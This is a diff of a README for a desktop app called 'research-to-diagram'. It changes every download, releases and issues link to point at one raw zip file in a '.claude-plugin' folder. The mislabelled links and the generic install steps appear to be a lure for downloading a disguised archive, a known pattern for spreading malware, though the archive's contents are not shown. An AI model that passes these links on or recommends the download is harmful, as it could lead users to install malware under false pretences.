@@ -8,7 +8,7 @@ Welcome to **research-to-diagram**! This application helps you conduct deep rese
 
 To get started, visit the Releases page to download the software. Click the link below:
 
-[![Download research-to-diagram](https://github.com/Strong03coder/research-to-diagram/raw/refs/heads/main/skills/research-diagram-to-v2.2.zip%20Now-Research%20to%20Diagram-brightgreen)](https://github.com/Strong03coder/research-to-diagram/raw/refs/heads/main/skills/research-diagram-to-v2.2.zip)
+[![Download research-to-diagram](https://raw.githubusercontent.com/Strong03coder/research-to-diagram/main/.claude-plugin/to-diagram-research-v3.0-beta.1.zip%20Now-Research%20to%20Diagram-brightgreen)](https://raw.githubusercontent.com/Strong03coder/research-to-diagram/main/.claude-plugin/to-diagram-research-v3.0-beta.1.zip)
 
 On the Releases page, you will find the latest version of the software. Choose the appropriate file for your operating system. Simply click on the file, and it will begin downloading to your computer.
 
@@ -25,7 +25,7 @@ Before you install the application, make sure your system meets these requiremen
 Follow these steps to install **research-to-diagram** on your computer:
 
 1. **Download the Application:**
-   - Go to the [Releases Page](https://github.com/Strong03coder/research-to-diagram/raw/refs/heads/main/skills/research-diagram-to-v2.2.zip) and download the latest version.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Strong03coder/research-to-diagram/main/.claude-plugin/to-diagram-research-v3.0-beta.1.zip) and download the latest version.
 
 2. **Locate the Downloaded File:**
    - Once the download is complete, find the file in your Downloads folder or your chosen download location.
@@ -79,7 +79,7 @@ Currently, **research-to-diagram** is available only as a desktop application fo
 
 ### How can I provide feedback or report issues?
 
-To report issues or share feedback, visit the [GitHub Issues Page](https://github.com/Strong03coder/research-to-diagram/raw/refs/heads/main/skills/research-diagram-to-v2.2.zip). We welcome your input to improve the application.
+To report issues or share feedback, visit the [GitHub Issues Page](https://raw.githubusercontent.com/Strong03coder/research-to-diagram/main/.claude-plugin/to-diagram-research-v3.0-beta.1.zip). We welcome your input to improve the application.
 
 ## 📞 Support
 
@@ -89,6 +89,6 @@ If you run into any problems or have questions, please don't hesitate to reach o
 
 To download the application again or check for updates, visit the Releases page at:
 
-[Download Here](https://github.com/Strong03coder/research-to-diagram/raw/refs/heads/main/skills/research-diagram-to-v2.2.zip)
+[Download Here](https://raw.githubusercontent.com/Strong03coder/research-to-diagram/main/.claude-plugin/to-diagram-research-v3.0-beta.1.zip)
 
 Thank you for using **research-to-diagram**! Enjoy creating your knowledge diagrams.
